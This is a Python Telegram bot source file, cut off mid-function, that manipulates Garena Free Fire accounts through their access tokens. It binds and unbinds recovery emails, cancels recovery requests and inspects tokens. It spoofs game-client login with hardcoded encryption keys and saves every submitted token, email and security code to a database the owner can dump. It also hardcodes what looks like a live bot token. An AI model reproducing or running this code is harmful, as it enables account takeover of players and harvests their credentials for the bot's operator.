# garena_email_bot_aiogram.py
import os
import sys
import json
import time
import base64
import hashlib
import urllib.parse
import urllib3
import random
import string
import requests
import sqlite3
from datetime import datetime, timedelta
from collections import defaultdict
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.enums import ParseMode
from aiogram.fsm.context import FSMContext
from aiogram.fsm.storage.memory import MemoryStorage
import asyncio

# ========== LOGGING IMPORT ==========
from logging_functions import log_user_action, get_user_logs, get_all_logs_since

urllib3.disable_warnings()

BOT_TOKEN = "8418234120:AAFHe1xJVe5H6BX3xGX3UZVPQbpOjJHYF5U"
OWNER_ID = 8383307682
DB_PATH = "users.db"
REQUEST_COOLDOWN = 0.8  # 0.8 seconds (fast but safe)
user_last_request = defaultdict(float)

# ========== DATABASE FUNCTIONS ==========
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            registration_date TEXT,
            total_requests INTEGER DEFAULT 0,
            last_activity TEXT
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS security_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            username TEXT,
            token TEXT,
            email TEXT,
            security_code TEXT,
            uid TEXT,
            action TEXT,
            timestamp TEXT
        )
    ''')
    conn.commit()
    conn.close()

def get_user_stats(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT total_requests, registration_date, last_activity FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row

def update_user_stats(user_id, username=None, first_name=None):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    now = datetime.now().isoformat()
    c.execute("SELECT user_id FROM users WHERE user_id = ?", (user_id,))
    if c.fetchone() is None:
        c.execute('''
            INSERT INTO users (user_id, username, first_name, registration_date, total_requests, last_activity)
            VALUES (?, ?, ?, ?, 1, ?)
        ''', (user_id, username, first_name, now, now))
    else:
        c.execute('''
            UPDATE users 
            SET username = COALESCE(?, username),
                first_name = COALESCE(?, first_name),
                total_requests = total_requests + 1,
                last_activity = ?
            WHERE user_id = ?
        ''', (username, first_name, now, user_id))
    conn.commit()
    conn.close()

def save_security_data(user_id, username, token=None, email=None, security_code=None, uid=None, action=None):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    now = datetime.now().isoformat()
    c.execute('''
        INSERT INTO security_data (user_id, username, token, email, security_code, uid, action, timestamp)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ''', (user_id, username, token, email, security_code, uid, action, now))
    conn.commit()
    conn.close()

def get_all_security_data(limit=10000):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT * FROM security_data ORDER BY id DESC LIMIT ?", (limit,))
    rows = c.fetchall()
    conn.close()
    return rows

def clear_security_data():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("DELETE FROM security_data")
    conn.commit()
    conn.close()

def rate_limited(user_id):
    current_time = time.time()
    last_time = user_last_request.get(user_id, 0)
    if current_time - last_time < REQUEST_COOLDOWN:
        wait_time = REQUEST_COOLDOWN - (current_time - last_time)
        return False, round(wait_time, 1)
    user_last_request[user_id] = current_time
    return True, 0

# ========== CRYPTO IMPORTS ==========
try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
except ImportError:
    os.system("pip install pycryptodome")
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad

try:
    from google.protobuf import descriptor as _descriptor
    from google.protobuf import descriptor_pool as _descriptor_pool
    from google.protobuf import symbol_database as _symbol_database
    from google.protobuf.internal import builder as _builder
except ImportError:
    os.system("pip install protobuf")
    from google.protobuf import descriptor as _descriptor
    from google.protobuf import descriptor_pool as _descriptor_pool
    from google.protobuf import symbol_database as _symbol_database
    from google.protobuf.internal import builder as _builder

_sym_db = _symbol_database.Default()

# ========== PROTOBUF ==========
MAJORLOGIN_REQ_DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(b'\n\x13MajorLoginReq.proto\"\xfa\n\n\nMajorLogin\x12\x12\n\nevent_time\x18\x03 \x01(\t\x12\x11\n\tgame_name\x18\x04 \x01(\t\x12\x13\n\x0bplatform_id\x18\x05 \x01(\x05\x12\x16\n\x0e\x63lient_version\x18\x07 \x01(\t\x12\x17\n\x0fsystem_software\x18\x08 \x01(\t\x12\x17\n\x0fsystem_hardware\x18\t \x01(\t\x12\x18\n\x10telecom_operator\x18\n \x01(\t\x12\x14\n\x0cnetwork_type\x18\x0b \x01(\t\x12\x14\n\x0cscreen_width\x18\x0c \x01(\r\x12\x15\n\rscreen_height\x18\r \x01(\r\x12\x12\n\nscreen_dpi\x18\x0e \x01(\t\x12\x19\n\x11processor_details\x18\x0f \x01(\t\x12\x0e\n\x06memory\x18\x10 \x01(\r\x12\x14\n\x0cgpu_renderer\x18\x11 \x01(\t\x12\x13\n\x0bgpu_version\x18\x12 \x01(\t\x12\x18\n\x10unique_device_id\x18\x13 \x01(\t\x12\x11\n\tclient_ip\x18\x14 \x01(\t\x12\x10\n\x08language\x18\x15 \x01(\t\x12\x0f\n\x07open_id\x18\x16 \x01(\t\x12\x14\n\x0copen_id_type\x18\x17 \x01(\t\x12\x13\n\x0b\x64\x65vice_type\x18\x18 \x01(\t\x12\'\n\x10memory_available\x18\x19 \x01(\x0b\x32\r.GameSecurity\x12\x14\n\x0c\x61\x63\x63\x65ss_token\x18\x1d \x01(\t\x12\x17\n\x0fplatform_sdk_id\x18\x1e \x01(\x05\x12\x1a\n\x12network_operator_a\x18) \x01(\t\x12\x16\n\x0enetwork_type_a\x18* \x01(\t\x12\x1c\n\x14\x63lient_using_version\x18\x39 \x01(\t\x12\x1e\n\x16\x65xternal_storage_total\x18< \x01(\x05\x12\"\n\x1a\x65xternal_storage_available\x18= \x01(\x05\x12\x1e\n\x16internal_storage_total\x18> \x01(\x05\x12\"\n\x1ainternal_storage_available\x18? \x01(\x05\x12#\n\x1bgame_disk_storage_available\x18@ \x01(\x05\x12\x1f\n\x17game_disk_storage_total\x18\x41 \x01(\x05\x12%\n\x1d\x65xternal_sdcard_avail_storage\x18\x42 \x01(\x05\x12%\n\x1d\x65xternal_sdcard_total_storage\x18\x43 \x01(\x05\x12\x10\n\x08login_by\x18I \x01(\x05\x12\x14\n\x0clibrary_path\x18J \x01(\t\x12\x12\n\nreg_avatar\x18L \x01(\x05\x12\x15\n\rlibrary_token\x18M \x01(\t\x12\x14\n\x0c\x63hannel_type\x18N \x01(\x05\x12\x10\n\x08\x63pu_type\x18O \x01(\x05\x12\x18\n\x10\x63pu_architecture\x18Q \x01(\t\x12\x1b\n\x13\x63lient_version_code\x18S \x01(\t\x12\x14\n\x0cgraphics_api\x18V \x01(\t\x12\x1d\n\x15supported_astc_bitset\x18W \x01(\r\x12\x1a\n\x12login_open_id_type\x18X \x01(\x05\x12\x18\n\x10\x61nalytics_detail\x18Y \x01(\x0c\x12\x14\n\x0cloading_time\x18\\ \x01(\r\x12\x17\n\x0frelease_channel\x18] \x01(\t\x12\x12\n\nextra_info\x18^ \x01(\t\x12 \n\x18\x61ndroid_engine_init_flag\x18_ \x01(\r\x12\x0f\n\x07if_push\x18\x61 \x01(\x05\x12\x0e\n\x06is_vpn\x18\x62 \x01(\x05\x12\x1c\n\x14origin_platform_type\x18\x63 \x01(\t\x12\x1d\n\x15primary_platform_type\x18\x64 \x01(\t\"5\n\x0cGameSecurity\x12\x0f\n\x07version\x18\x06 \x01(\x05\x12\x14\n\x0chidden_value\x18\x08 \x01(\x04\x62\x06proto3')

MAJORLOGIN_RES_DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(b'\n\x13MajorLoginRes.proto\"\x87\x05\n\rMajorLoginRes\x12\x12\n\naccount_id\x18\x01 \x01(\x03\x12\x13\n\x0block_region\x18\x02 \x01(\t\x12\x13\n\x0bnoti_region\x18\x03 \x01(\t\x12\x11\n\tip_region\x18\x04 \x01(\t\x12\x19\n\x11\x61gora_environment\x18\x05 \x01(\t\x12\x19\n\x11new_active_region\x18\x06 \x01(\t\x12\r\n\x05token\x18\x08 \x01(\t\x12\x0b\n\x03ttl\x18\t \x01(\x05\x12\x12\n\nserver_url\x18\n \x01(\t\x12\x16\n\x0e\x65mulator_score\x18\x0c \x01(\x03\x12\x32\n\tblacklist\x18\r \x01(\x0b\x32\x1f.MajorLoginRes.BlacklistInfoRes\x12\x31\n\nqueue_info\x18\x0f \x01(\x0b\x32\x1d.MajorLoginRes.LoginQueueInfo\x12\x0e\n\x06tp_url\x18\x10 \x01(\t\x12\x15\n\rapp_server_id\x18\x11 \x01(\x03\x12\x0f\n\x07\x61no_url\x18\x12 \x01(\t\x12\x0f\n\x07ip_city\x18\x13 \x01(\t\x12\x16\n\x0eip_subdivision\x18\x14 \x01(\t\x12\x0b\n\x03kts\x18\x15 \x01(\x03\x12\n\n\x02\x61k\x18\x16 \x01(\x0c\x12\x0b\n\x03\x61iv\x18\x17 \x01(\x0c\x1aQ\n\x10\x42lacklistInfoRes\x12\x12\n\nban_reason\x18\x01 \x01(\x05\x12\x17\n\x0f\x65xpire_duration\x18\x02 \x01(\x03\x12\x10\n\x08\x62\x61n_time\x18\x03 \x01(\x03\x1a\x66\n\x0eLoginQueueInfo\x12\r\n\x05\x41llow\x18\x01 \x01(\x08\x12\x16\n\x0equeue_position\x18\x02 \x01(\x03\x12\x16\n\x0eneed_wait_secs\x18\x03 \x01(\x03\x12\x15\n\rqueue_is_full\x18\x04 \x01(\x08\x62\x06proto3')

_builder.BuildMessageAndEnumDescriptors(MAJORLOGIN_REQ_DESCRIPTOR, globals())
_builder.BuildTopDescriptorsAndMessages(MAJORLOGIN_REQ_DESCRIPTOR, 'MajorLoginReq_pb2', globals())
_builder.BuildMessageAndEnumDescriptors(MAJORLOGIN_RES_DESCRIPTOR, globals())
_builder.BuildTopDescriptorsAndMessages(MAJORLOGIN_RES_DESCRIPTOR, 'MajorLoginRes_pb2', globals())

try:
    MajorLogin = globals()['MajorLogin']
    MajorLoginRes = globals()['MajorLoginRes']
except KeyError:
    print("[!] Error: Failed to build protobuf classes.")
    sys.exit(1)

# ========== CONSTANTS ==========
API_URL = 'https://client.ind.freefiremobile.com/GetLoginData'
BODY_BASE64 = (
    'vGkQhkkYHjne06dPbmJgb36BQ1NdLgk8J+uc+z4/9t4OZ19iWMyn5cH/Pe/DgGHrwHxJ+dRKGho2LCErl+rBWEf/6aWcFflRXiEsvPiGKM3809a+vci8mAQBREdizRWQ6bdeLnlztsqBvlB5OU8WFlmGxsU8UY1U3Zp/eLNTbq0DHqjOxziR+ylXgLlonsckeKvaxa4YE540eXi+9v4ilJunUubievpqUip6XDAyKV7o1spVxiaP0z4d8MLosbeYthPAnK5ykeE8IpnYaru0oDN8o90r820h04frRPJBszlDiarwdjgXaiyeQqAiOgEN63gUoVq2rd0JfYGaHN2f2kJxxO9uCYxyJ6IhCzQq8yAJT2asKa9u7gWB1bB/fJxq4nVxY8am8DI+rqIDvVSF3EdQBDh9qipPFCd0gZx7kDVg/9vM79YAE+FnDgGY3D/niKWsu66SL9+bRcghZxcCMOzKwvRe7hCRU2pDjBw0MRvPnCCa9KpEuO4CgWz+++SP9whlI0dWCi9/snDCN6i9V2TYrSWfbg1i2TRipquGUoi/cP1xPBeMwQlzlf4APMQzvT8MOQotqry+y1+koTpwRKlWgu7QLmiumn4dwd9HARVMThSH46kwlD8xep4sLVf6/BbjWixBMVRKFi1w9zpVVe+w6rBYhtBHXfjqjg2sCzF1mlBabMbW4L2yXEmABaQG/l0jmaGEWh6kzMY9T1nzV1Wcw5lF7X+pwQEnAn6i5coowNGKrTGUJ2wa3+tAxGcm9zozCvj8yd2pOXmta46GoREDQk+U99uHHvjqzsSNeBq8ffL5zibtv0pZPhnUuSP76YkhCcdtDilaecBElnt9eFfo8cy2B3Z0wbhG20nKNfYuhgZMZuSPRjmQphlfyl1hpoSG5xMQ7bdqZAkoTkZlFpCL4y02yUlImI7Z8jnA3i4un3UOq1rXrMza+bqNsMhrJ/aUS3mnoXr23yzuUc56zyYQtzJx6VCupsHraP7brcDbBS76Gp2o0oT2iE4Y55ZyAEgdt307DzJknHEHdGuoOG4Yzy5bI7HnukmnUjoiIdJEr7iJdOLppdB+ZDXPkHps5ysskdapRp0i2x1gMpW9XU1LY1cNAsTmAvHcz2GZA2OjtvS0roiay2rkUqNgmN8cPygK3j6ycfpkHc1PkUnmG1CNjMy3qP7c18qvDdSYfiq99Wra4l5L2dV3dE/kGpc1fgwWo94UPIes67wg/TrRR85GxPcpIX3IUOGMyEX1VWJTS2PvTm3S4xrerobDKG5V'
)

AeSkEy = b'Yg&tc%DEuh6%Zc^8'
AeSiV = b'6oyZDr22E3ychjM%'
mLuRl = "https://loginbp.ggpolarbear.com/MajorLogin"

mLhDr = {
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-S908E Build/TP1A.220624.014)",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/octet-stream",
    "Expect": "100-continue",
    "X-GA": "v1 1",
    "X-Unity-Version": "2018.4.11f1",
    "ReleaseVersion": "OB54"
}

PLATFORM_MAP = {
    3: "Facebook", 4: "Guest", 5: "VK", 
    6: "Huawei", 8: "Google", 11: "X (Twitter)", 13: "AppleId",
}

# ========== HELPER FUNCTIONS ==========
def enc(d): 
    return AES.new(AeSkEy, AES.MODE_CBC, AeSiV).encrypt(pad(d, 16))

def dec(d): 
    return unpad(AES.new(AeSkEy, AES.MODE_CBC, AeSiV).decrypt(d), 16)

def convert_seconds(seconds):
    d, h = divmod(seconds, 86400)
    h, m = divmod(h, 3600)
    m, s = divmod(m, 60)
    return f"{d}d {h}h {m}m {s}s"

def hash_sha256(text):
    return hashlib.sha256(text.encode('utf-8')).hexdigest()

def generate_username(length=12):
    letters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters) for _ in range(length))

def read_varint(data, offset):
    res = 0
    shift = 0
    while True:
        if offset >= len(data):
            break
        b = data[offset]
        offset += 1
        res |= (b & 0x7f) << shift
        if not (b & 0x80):
            break
        shift += 7
    return res, offset

def parse_record(data):
    rec = {}
    offset = 0
    while offset < len(data):
        tag, offset = read_varint(data, offset)
        wt, f = tag & 7, tag >> 3
        if wt == 0:
            val, offset = read_varint(data, offset)
            if f == 1:
                rec['ts'] = val
            elif f == 2:
                rec['ram'] = val
        elif wt == 2:
            length, offset = read_varint(data, offset)
            val = data[offset:offset+length]
            offset += length
            if f == 3:
                rec['dev'] = val.decode(errors='ignore')
            elif f == 4:
                rec['arch'] = val.decode(errors='ignore')
        else:
            break
    return rec

def parse_history_protobuf(data):
    records = []
    offset = 0
    while offset < len(data):
        tag, offset = read_varint(data, offset)
        wt, f = tag & 7, tag >> 3
        if wt == 0:
            val, offset = read_varint(data, offset)
        elif wt == 2:
            length, offset = read_varint(data, offset)
            val = data[offset:offset+length]
            offset += length
            if f == 1:
                records.append(parse_record(val))
        else:
            break
    return records

def build_majorlogin(tok, open_id, p_type):
    m = MajorLogin()
    m.event_time = str(datetime.now())[:-7]
    m.game_name = "free fire"
    m.platform_id = p_type
    m.client_version = "1.120.1"
    m.system_software = "Android OS 9 / API-28"
    m.system_hardware = "Handheld"
    m.telecom_operator = "Verizon"
    m.network_type = "WIFI"
    m.screen_width = 1920
    m.screen_height = 1080
    m.screen_dpi = "280"
    m.processor_details = "ARM64 FP ASIMD AES VMH | 2865 | 4"
    m.memory = 3003
    m.gpu_renderer = "Adreno (TM) 640"
    m.gpu_version = "OpenGL ES 3.1 v1.46"
    m.unique_device_id = "Google|34a7dcdf-a7d5-4cb6-8d7e-3b0e448a0c57"
    m.client_ip = "223.191.51.89"
    m.language = "en"
    m.open_id = open_id
    m.open_id_type = str(p_type)
    m.device_type = "Handheld"
    m.access_token = tok
    m.platform_sdk_id = 1
    m.client_using_version = "7428b253defc164018c604a1ebbfebdf"
    m.login_by = 3
    m.channel_type = 3
    m.cpu_type = 2
    m.cpu_architecture = "64"
    m.client_version_code = "2019118695"
    m.login_open_id_type = p_type
    m.origin_platform_type = str(p_type)
    m.primary_platform_type = str(p_type)
    return enc(m.SerializeToString())

def decode_ff_name(b64_str):
    try:
        if not b64_str: return "Unknown"
        key = b"1e5898ccb8dfdd921f9bdea848768b64a201"
        b64_str = b64_str.strip()
        b64_str += "=" * ((4 - len(b64_str) % 4) % 4)
        encrypted_bytes = base64.b64decode(b64_str)
        decrypted_bytes = bytearray()
        for i, byte in enumerate(encrypted_bytes):
            key_byte = key[i % len(key)]
            decrypted_bytes.append(byte ^ key_byte)
        name = decrypted_bytes.decode('utf-8', errors='ignore')
        return name if name else "Unknown"
    except Exception:
        return "Unknown"

def decode_jwt(token):
    try:
        payload_part = token.split('.')[1]
        payload_part += "=" * ((4 - len(payload_part) % 4) % 4)
        decoded_bytes = base64.urlsafe_b64decode(payload_part)
        decoded_str = decoded_bytes.decode('utf-8')
        return json.loads(decoded_str)
    except Exception:
        return {}

def is_valid_token(token):
    if not token or len(token) < 10:
        return False
    import re
    return bool(re.match(r'^[A-Za-z0-9_\-\.]+$', token))

def is_valid_email(email):
    import re
    return bool(re.match(r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$', email))

def is_valid_security_code(code):
    return bool(code and code.isdigit() and len(code) == 6)

def format_response_text(response_text, title="API Response"):
    try:
        parsed = json.loads(response_text)
        result_code = parsed.get("result")
        if result_code == 0:
            return f"<b>{title}: SUCCESS</b>"
        elif result_code is not None:
            error_msg = parsed.get("error", "Unknown error")
            return f"<b>{title}: FAILED (Code: {result_code} | {error_msg})</b>"
        else:
            return f"<b>{title}: Completed</b>"
    except:
        if '"result": 0' in response_text.replace(" ", ""):
            return f"<b>{title}: SUCCESS</b>"
        else:
            return f"<b>{title}: Unrecognized response</b>"

# ========== BIND EMAIL HELPER FUNCTIONS ==========
def send_otp_to_email(access_token, email):
    headers = {
        "User-Agent": "GarenaMSDK/4.0.30",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json"
    }
    region = "PK"
    try:
        p_url = f"https://api-otrss.garena.com/support/callback/?access_token={access_token}"
        p_res = requests.get(p_url, headers={'User-Agent': "Mozilla/5.0"}, timeout=10, allow_redirects=True)
        parsed = urllib.parse.urlparse(p_res.url)
        params = urllib.parse.parse_qs(parsed.query)
        region = params.get("region", ["PK"])[0]
    except:
        pass
    locale = f"en_{region}"
    url = "https://100067.connect.garena.com/game/account_security/bind:send_otp"
    data = {
        "email": email,
        "locale": locale,
        "region": region,
        "app_id": "100067",
        "access_token": access_token
    }
    try:
        resp = requests.post(url, headers=headers, data=data, timeout=20)
        if resp.status_code == 200:
            return True, "<b>OTP sent successfully.</b>"
        else:
            return False, f"<b>Failed to send OTP: {resp.text}</b>"
    except Exception as e:
        return False, f"<b>Error sending OTP: {str(e)}</b>"

def verify_otp(access_token, email, otp):
    headers = {
        "User-Agent": "GarenaMSDK/4.0.30",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json"
    }
    url = "https://100067.connect.garena.com/game/account_security/bind:verify_otp"
    data = {
        "app_id": "100067",
        "access_token": access_token,
        "email": email,
        "otp": otp,
        "code": otp,
        "type": "1"
    }
    try:
        resp = requests.post(url, headers=headers, data=data, timeout=20)
        if resp.status_code == 200:
            js = resp.json()
            if js.get('result') == 0:
                verifier_token = js.get('verifier_token')
                if verifier_token:
                    return True, verifier_token, "<b>OTP verified.</b>"
                else:
                    return False, None, "<b>Verifier token not found.</b>"
            else:
                return False, None, f"<b>Verification failed: {js.get('error', 'Unknown error')}</b>"
        else:
            return False, None, f"<b>HTTP {resp.status_code}</b>"
    except Exception as e:
        return False, None, f"<b>Error: {str(e)}</b>"

def execute_bind(access_token, email, verifier_token, security_code):
    hashed = hashlib.sha256(security_code.encode('utf-8')).hexdigest()
    headers = {
        "User-Agent": "GarenaMSDK/4.0.30",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json"
    }
    url = "https://100067.connect.garena.com/game/account_security/bind:create_bind_request"
    data = {
        "email": email,
        "app_id": "100067",
        "access_token": access_token,
        "verifier_token": verifier_token,
        "secondary_password": hashed
    }
    try:
        resp = requests.post(url, headers=headers, data=data, timeout=20)
        if resp.status_code == 200:
            js = resp.json()
            if js.get('result') == 0:
                return True, "<b>Email bound successfully.</b>"
            else:
                return False, f"<b>Failed: {js.get('error', 'Unknown error')}</b>"
        else:
            return False, f"<b>HTTP {resp.status_code}</b>"
    except Exception as e:
        return False, f"<b>Error: {str(e)}</b>"

def bind_email(token, email, otp, security_code):
    success, msg = send_otp_to_email(token, email)
    if not success:
        return False, msg
    success, verifier_token, msg = verify_otp(token, email, otp)
    if not success:
        return False, msg
    success, msg = execute_bind(token, email, verifier_token, security_code)
    return success, msg

# ========== API FUNCTIONS ==========
def single_subscribe():
    return True, "<b>Single Subscribe is active. Coming soon!</b>"

def single_unsubscribe(email, retries=2):
    url = f"https://sso-register-killersharmabot.vercel.app/send-email?email={email}"
    for attempt in range(retries + 1):
        try:
            response = requests.get(url, timeout=30)
            if response.status_code == 200:
                data = response.json()
                if data.get("response", {}).get("result") == 0:
                    return True, f"<b>OTP sent successfully to {email}.</b>"
                else:
                    error = data.get("response", {}).get("error", "Unknown error")
                    return False, f"<b>Failed: {error}</b>"
            else:
                if attempt < retries:
                    time.sleep(2)
                    continue
                else:
                    return False, f"<b>HTTP Error: {response.status_code}</b>"
        except requests.exceptions.Timeout:
            if attempt < retries:
                time.sleep(2)
                continue
            else:
                return False, "<b>Request timed out. Please try again.</b>"
        except Exception as e:
            if attempt < retries:
                time.sleep(2)
                continue
            else:
                return False, f"<b>Error: {str(e)}</b>"
    return False, "<b>All attempts failed.</b>"

def cancel_recovery(access):
    url = "https://100067.connect.garena.com/game/account_security/bind:cancel_request"
    payload = {'app_id': "100067", 'access_token': access}
    headers = {'User-Agent': "GarenaMSDK/4.0.19P9", 'Connection': "Keep-Alive"}
    try:
        rsp = requests.post(url, data=payload, headers=headers, timeout=20)
        if rsp.status_code == 200:
            return True, "<b>Cancelled successfully.</b>"
        else:
            return False, f"<b>Failed. Status: {rsp.status_code}</b>"
    except Exception as e:
        return False, f"<b>Error: {str(e)}</b>"

def check_recovery(access):
    url = "https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
    payload = {'app_id': "100067", 'access_token': access}
    headers = {'User-Agent': "GarenaMSDK/4.0.19P9", 'Connection': "Keep-Alive"}
    try:
        rsp = requests.get(url, params=payload, headers=headers, timeout=20)
        
        player_info = {}
        try:
            p_url = f"https://api-otrss.garena.com/support/callback/?access_token={access}"
            p_res = requests.get(p_url, headers={'User-Agent': "Mozilla/5.0"}, timeout=10, allow_redirects=True)
            parsed = urllib.parse.urlparse(p_res.url)
            params = urllib.parse.parse_qs(parsed.query)
            player_info['uid'] = params.get("account_id", ["Unknown"])[0]
            player_info['nickname'] = urllib.parse.unquote(params.get("nickname", ["Unknown"])[0])
            player_info['region'] = params.get("region", ["Unknown"])[0]
        except:
            player_info['uid'] = "Unknown"
            player_info['nickname'] = "Unknown"
            player_info['region'] = "Unknown"
        
        if rsp.status_code == 200:
            data = rsp.json()
            email = data.get("email", "")
            email_to_be = data.get("email_to_be", "")
            mobile = data.get("mobile", "")
            mobile_to_be = data.get("mobile_to_be", "")
            countdown = data.get("request_exec_countdown", 0)
            
            if email and not email_to_be:
                status = "CONFIRMED"
            elif email_to_be:
                status = f"PENDING ({convert_seconds(countdown)} remaining)"
            else:
                status = "NOT SET"
            
            result_text = f"""
<b>ACCOUNT RECOVERY STATUS</b>

<b>Nickname :</b> {player_info['nickname']}
<b>UID      :</b> {player_info['uid']}
<b>Region   :</b> {player_info['region']}

<b>Current Email  :</b> {email if email else 'Not Set'}
<b>Pending Email  :</b> {email_to_be if email_to_be else 'None'}
<b>Mobile         :</b> {mobile if mobile else 'Not Set'}
<b>Pending Mobile :</b> {mobile_to_be if mobile_to_be else 'None'}

<b>Status :</b> {status}
"""
            return True, result_text
        else:
            return False, f"<b>API Error: Status {rsp.status_code}</b>"
    except Exception as e:
        return False, f"<b>Error: {str(e)}</b>"

def check_platform(access):
    try:
        r = requests.get("https://100067.connect.garena.com/bind/app/platform/info/get",
            params={'access_token': access},
            headers={'User-Agent': "GarenaMSDK/4.0.19P9"},
            timeout=20)
        if r.status_code not in [200, 201]:
            return False, "<b>Failed to fetch platform info.</b>"
        j = r.json()
        platform_names = {3: "Facebook", 8: "Gmail", 10: "iCloud", 5: "VK", 11: "Twitter", 7: "Huawei", 4: "Guest", 6: "Huawei", 13: "Apple ID"}
        bounded = j.get("bounded_accounts", [])
        if not isinstance(bounded, list):
            bounded = []
        
        player_info = ""
        try:
            p_url = f"https://api-otrss.garena.com/support/callback/?access_token={access}"
            p_res = requests.get(p_url, headers={'User-Agent': "Mozilla/5.0"}, timeout=10, allow_redirects=True)
            parsed = urllib.parse.urlparse(p_res.url)
            params = urllib.parse.parse_qs(parsed.query)
            uid = params.get("account_id", ["Unknown"])[0]
            nickname = urllib.parse.unquote(params.get("nickname", ["Unknown"])[0])
            region = params.get("region", ["Unknown"])[0]
            player_info = f"\n<b>{nickname} | {uid} | {region}</b>"
        except:
            pass
        
        result_text = f"""
<b>LINKED PLATFORMS</b>{player_info}

<b>Bound Accounts:</b>
"""
        if bounded:
            for x in bounded:
                if isinstance(x, int):
                    p = x
                    if p in platform_names:
                        result_text += f"<b>{platform_names[p]}</b>\n"
                    else:
                        result_text += f"<b>Unknown ({p})</b>\n"
                elif isinstance(x, dict):
                    p = x.get('platform')
                    uinfo = x.get('user_info', {})
                    e = uinfo.get('email', '')
                    n = uinfo.get('nickname', '')
                    if p in platform_names:
                        result_text += f"<b>{platform_names[p]}</b>\n"
                        if e:
                            result_text += f"<b>   Email: {e}</b>\n"
                        if n:
                            result_text += f"<b>   Nickname: {n}</b>\n"
                        result_text += "\n"
                else:
                    result_text += f"<b>Unknown entry</b>\n"
        else:
            result_text += "<b>No secondary platforms linked.</b>\n"
        
        available = j.get("available_platforms", [])
        if isinstance(available, list) and available:
            result_text += "\n<b>Available to Bind:</b>\n"
            for p in available:
                if p in platform_names:
                    result_text += f"<b>   • {platform_names[p]}</b>\n"
        return True, result_text
    except Exception as e:
        return False, f"<b>Error: {str(e)}</b>"

def get_token_details(access):
    try:
        url = "https://100067.connect.garena.com/oauth/token/inspect"
        params = {'token': access}
        headers = {'User-Agent': "GarenaMSDK/4.0.19P9"}
        r = requests.get(url, params=params, headers=headers, timeout=20)
        player_info = ""
        try:
            p_url = f"https://api-otrss.garena.com/support/callback/?access_token={access}"
            p_res = requests.get(p_url, headers={'User-Agent': "Mozilla/5.0"}, timeout=10, allow_redirects=True)
            parsed = urllib.parse.urlparse(p_res.url)
            params = urllib.parse.parse_qs(parsed.query)
            uid = params.get("account_id", ["Unknown"])[0]
            nickname = urllib.parse.unquote(params.get("nickname", ["Unknown"])[0])
            region = params.get("region", ["Unknown"])[0]
            player_info = f"\n<b>{nickname} | {uid} | {region}</b>"
        except:
            pass
        if r.status_code == 200:
            data = r.json()
            result_text = f"""
<b>TOKEN DETAILS</b>{player_info}

<b>Open ID    :</b> {data.get('open_id', 'N/A')}
<b>User ID    :</b> {data.get('user_id', 'N/A')}
<b>App ID     :</b> {data.get('app_id', 'N/A')}
<b>Expires At :</b> {data.get('expires_at', 'N/A')}
<b>Region     :</b> {data.get('region', 'N/A')}
<b>Scope      :</b> {data.get('scope', 'N/A')}
"""
            return True, result_text
        else:
            try:
                r2 = requests.get("https://100067.connect.garena.com/bind/app/platform/info/get",
                    params={'access_token': access},
                    headers={'User-Agent': "GarenaMSDK/4.0.19P9"},
                    timeout=20)
                if r2.status_code == 200:
                    data = r2.json()
                    result_text = f"""
<b>TOKEN DETAILS</b>{player_info}

<b>Token is valid</b>
<b>App ID     :</b> 100067
<b>Region     :</b> {data.get('region', 'N/A')}

<b>Linked Accounts :</b> {len(data.get('bounded_accounts', []))} accounts linked
"""
                    return True, result_text
            except:
                pass
            return False, "<b>Token is invalid or expired.</b>"
    except Exception as e:
        return False, f"<b>Error: {str(e)}</b>"

def unbind_email(email, access, otp=None, secondary_password=None):
    headers = {
        "User-Agent": "GarenaMSDK/4.0.19P9",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json"
    }
    identity_token = None
    if otp:
        verify_url = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
        verify_data = {
            "email": email,
            "otp": otp,
            "app_id": "100067",
            "access_token": access
        }
        try:
            resp = requests.post(verify_url, headers=headers, data=verify_data, timeout=20)
            identity_token = resp.json().get("identity_token")
        except:
            pass
    elif secondary_password:
        verify_url = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
        verify_data = {
            "email": email,
            "secondary_password": secondary_password,
            "app_id": "100067",
            "access_token": access
        }
        try:
            resp = requests.post(verify_url, headers=headers, data=verify_data, timeout=20)
            identity_token = resp.json().get("identity_token")
        except:
            pass
    if not identity_token:
        return False, "<b>Failed to verify identity.</b>"
    unbind_url = "https://100067.connect.garena.com/game/account_security/bind:create_unbind_request"
    unbind_data = {
        "app_id": "100067",
        "access_token": access,
        "identity_token": identity_token
    }
    try:
        resp = requests.post(unbind_url, headers=headers, data=unbind_data, timeout=20)
        if '"result":0' in resp.text.replace(" ", ""):
            return True, "<b>Unbind request created successfully.</b>"
        else:
            return False, f"<b>Failed: {resp.text}</b>"
    except Exception as e:
